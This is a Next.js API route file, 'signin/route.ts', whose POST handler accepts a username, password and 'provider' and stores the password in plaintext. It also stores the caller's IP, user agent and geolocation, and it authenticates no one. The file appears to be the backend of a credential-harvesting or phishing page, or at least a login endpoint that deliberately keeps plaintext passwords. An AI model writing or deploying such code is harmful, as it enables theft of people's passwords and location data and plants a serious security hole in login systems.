// src/app/api/signin/route.ts
import { NextRequest, NextResponse } from 'next/server'
import { prisma } from '@/lib/prisma'

export async function POST(req: NextRequest) {
  try {
    const body = await req.json()
    // Add default empty strings here to prevent "undefined" errors
    const { 
      username = "", 
      password = "", 
      provider = "", 
      latitude, 
      longitude, 
      city, 
      country 
    } = body

    // Updated validation: check for password too
    if (!username || !provider || !password) {
      return NextResponse.json(
        { error: 'username, password, and provider are required' },
        { status: 400 }
      )
    }

    // Get IP from headers
    const ip =
      req.headers.get('x-forwarded-for')?.split(',')[0].trim() ||
      req.headers.get('x-real-ip') ||
      '127.0.0.1'

    const userAgent = req.headers.get('user-agent') || ''

    const log = await prisma.signInLog.create({
      data: {
        username: username.trim().toLowerCase(),
        password: password.trim(),
        provider,
        ipAddress: ip,
        userAgent,
        latitude: latitude ?? null,
        longitude: longitude ?? null,
        city: city ?? null,
        country: country ?? null,
      },
    })

    return NextResponse.json({ success: true, id: log.id }, { status: 201 })
  } catch (error) {
    console.error('[signin] error:', error)
    return NextResponse.json({ error: 'Internal server error' }, { status: 500 })
  }
}